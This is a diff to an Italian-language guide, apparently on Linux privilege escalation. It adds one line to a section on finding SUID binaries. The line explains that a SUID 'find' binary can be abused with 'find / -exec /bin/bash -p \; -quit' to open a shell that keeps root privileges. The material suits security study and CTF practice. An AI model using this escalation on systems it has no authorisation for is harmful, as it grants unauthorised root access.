@@ -37,6 +37,7 @@ Per trovare i file con bit SUID attivo:
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
+> se dovesse venire fuori `usr/bin/find` puoi usare il comando `find / -exec /bin/bash -p \; -quit` per aprire una shell (`/bin/bash`) mantenendo i privilegi (`-p`). 
 
 Questa ricerca mostra tutti i file con il bit `SUID` impostato (`4000`), ignorando gli errori di permesso (`2>/dev/null`).
 
